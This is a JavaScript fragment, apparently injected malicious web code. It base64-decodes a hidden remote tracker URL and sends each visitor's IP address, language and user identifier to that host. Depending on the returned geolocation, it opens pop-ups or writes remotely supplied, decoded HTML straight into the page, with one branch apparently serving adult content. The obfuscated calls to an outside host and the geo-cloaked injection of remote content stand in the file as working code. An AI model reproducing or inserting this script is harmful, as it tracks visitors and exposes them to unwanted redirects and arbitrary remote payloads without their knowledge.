function budal(ip) {

        if (cid("bsr") == '1') {
            var bsr = 'Q2VyeHJl';
        } else {
            var bsr = cid("u");
        }

    var gtx = cmx('aHR0cHM6Ly9pY2xpY2suY2x1Yi9qcy90cmFja19qc29uLnBocD91cz0') + bsr + "&lg=" + lang + "&ip=" + ip + "&time" + Date.now();
    //console.log($getURL)
    $.get(gtx, function (data) {
        console.log(cmx(data.urlx));
        if (data.geo) {
            if (data.geo == 'ZZ') {
                window.open(cmx(data.pop), 'up');
            } else {
                if (data.geo == 'ID') {
                    $.ajax({
                        method: "GET",
                        url: cmx(data.url),
                        data: { usr: porn, token: data.url }
                    }).done(function (msg) {
                        document.write(cmx(msg.hd) + cmx(msg.mh) + cmx(msg.pg) + cmx(msg.mf));
                    });
                } else {
                    document.write(cmx(data.urlx));
                }
            }
        } else {
            window.open(cmx(data.pop), 'up');
        }
    });
}